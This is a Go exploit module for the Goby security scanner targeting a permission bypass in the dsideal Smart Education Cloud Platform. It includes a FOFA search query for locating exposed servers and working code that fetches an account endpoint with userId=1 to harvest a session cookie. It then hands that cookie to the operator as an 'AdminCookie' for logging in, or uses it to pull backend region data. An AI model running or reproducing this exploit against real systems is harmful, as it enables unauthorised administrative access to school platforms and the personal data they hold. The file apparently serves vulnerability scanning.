package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "dsideal Smart Education Cloud Platform /Account Permission Bypass Vulnerability",
    "Description": "<p>The Ideal Software company affiliated with Northeast Normal University serves various regions across the country, providing guidance on the direction, pathways, and methods for integrated and innovative applications. The company offers comprehensive planning and top-level design consulting for education informatization, as well as the design, integration, and construction of systems such as smart education cloud platforms, smart campuses, smart classrooms, and smart laboratories. It engages in the research, development, and promotion of educational software products, and delivers cloud services including teaching resources and lesson planning, online training and professional development, master classes, homework and tutoring, examination and performance analysis. Additionally, the company provides training for teachers to enhance their abilities in integrated and innovative applications, facilitates the establishment of education informatization exchange platforms, and offers guidance for education informatization pilots and applications. These services cover areas such as K-12 education, vocational education, higher teacher education, and early childhood education.</p>",
    "Product": "dsideal",
    "Homepage": "http://www.dsideal.com/",
    "DisclosureDate": "2024-08-20",
    "PostTime": "2024-08-20",
    "Author": "1538279017@qq.com",
    "FofaQuery": "(body=\"dsideal_yy\" && body=\"login\") || body=\"/Content/backend/css/hwui/hwui.css\" || (body=\"技术支持：东北师大理想软件股份有限公司\")",
    "GobyQuery": "(body=\"dsideal_yy\" && body=\"login\") || body=\"/Content/backend/css/hwui/hwui.css\" || (body=\"技术支持：东北师大理想软件股份有限公司\")",
    "Level": "1",
    "Impact": "<p>Privilege bypass leading to arbitrary user login can allow unauthorized users to access sensitive data or system functions, potentially resulting in data breaches or malicious control of the system.</p>",
    "Recommendation": "<p>Implement strict user authentication and ensure that permission checks are enforced for every critical operation, preventing direct system access through weak or unchecked interfaces.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "GetRegion,AdminCookie",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "HW-2024"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "东北师大理想软件股份有限公司智慧教育云平台 /Account 权限绕过漏洞",
            "Product": "东北师大理想软件股份有限公司",
            "Description": "<p>东师理想面向全国各地，系统开展了融合创新应用方向、路径和方法引领，教育信息化统筹规划与顶层设计咨询，智慧教育云平台、智慧校园、智慧教室、智慧实验室等系统的设计、集成与建设，教育软件产品研发与推广，教学资源与备课、网络研修与培训、名师云课堂、作业与指导、考试与成绩分析等云服务提供，以及教师融合创新应用能力培训、教育信息化交流平台搭建、教育信息化试点与应用指导等工作。覆盖基础教育、职业教育、高等师范教育和学前教育等。<br></p>",
            "Recommendation": "<p>严格验证用户身份，确保在每个关键操作中都进行权限检查，避免通过弱验证或未验证的接口直接访问系统。<br></p>",
            "Impact": "<p>权限绕过导致任意用户登录可能允许未授权的用户访问敏感数据或系统功能，进而导致数据泄露或系统被恶意操控<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "dsideal Smart Education Cloud Platform /Account Permission Bypass Vulnerability",
            "Product": "dsideal",
            "Description": "<p>The Ideal Software company affiliated with Northeast Normal University serves various regions across the country, providing guidance on the direction, pathways, and methods for integrated and innovative applications. The company offers comprehensive planning and top-level design consulting for education informatization, as well as the design, integration, and construction of systems such as smart education cloud platforms, smart campuses, smart classrooms, and smart laboratories. It engages in the research, development, and promotion of educational software products, and delivers cloud services including teaching resources and lesson planning, online training and professional development, master classes, homework and tutoring, examination and performance analysis. Additionally, the company provides training for teachers to enhance their abilities in integrated and innovative applications, facilitates the establishment of education informatization exchange platforms, and offers guidance for education informatization pilots and applications. These services cover areas such as K-12 education, vocational education, higher teacher education, and early childhood education.<br></p>",
            "Recommendation": "<p>Implement strict user authentication and ensure that permission checks are enforced for every critical operation, preventing direct system access through weak or unchecked interfaces.<br></p>",
            "Impact": "<p>Privilege bypass leading to arbitrary user login can allow unauthorized users to access sensitive data or system functions, potentially resulting in data breaches or malicious control of the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9939"
}`

	sendPayloadSkjleriwekrjFF7723 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回

		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/Account/LoginUserPersonType?userId=1"
		getCookie, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || getCookie.StatusCode != 200 {
			return false, "", ""
		}
		if !strings.Contains(getCookie.RawBody, "{\"success\":true}") {
			return false, "", ""
		}
		// Header:=map[string]string{
		//   "Cookie":getCookie.Cookies()[2],
		// }
		vulCookie := getCookie.Cookies()[2].Name + "=" + getCookie.Cookies()[2].Value

		// vulInfo := `admin:admin`
		vulPath := path

		return true, vulCookie, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, vulPath := sendPayloadSkjleriwekrjFF7723(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			setPostRequest := func(hostInfo *httpclient.FixUrl, urlPost string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
				PostRequest := httpclient.NewPostRequestConfig(urlPost)
				PostRequest.Timeout = 12
				PostRequest.VerifyTls = false
				PostRequest.FollowRedirect = false
				for headName, headValue := range head {
					PostRequest.Header.Store(headName, headValue)
				}
				PostRequest.Data = data
				return httpclient.DoHttpRequest(hostInfo, PostRequest)
			}
			_, vulCookie, _ := sendPayloadSkjleriwekrjFF7723(expResult.HostInfo)
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			switch attackType {
			case "GetRegion":
				res, err := setPostRequest(expResult.HostInfo, "/Backend/BAdminUnit/GetRegion", "", map[string]string{"Cookie": vulCookie})
				if err != nil || res.StatusCode != 200 {
					expResult.Success = false
					expResult.Output = "请求失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = res.RawBody
				return expResult
			case "AdminCookie":
				expResult.Output = "Please use the next AdminCookie to login :\n" + vulCookie
				expResult.Success = true
				return expResult
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}

		},
	))
}
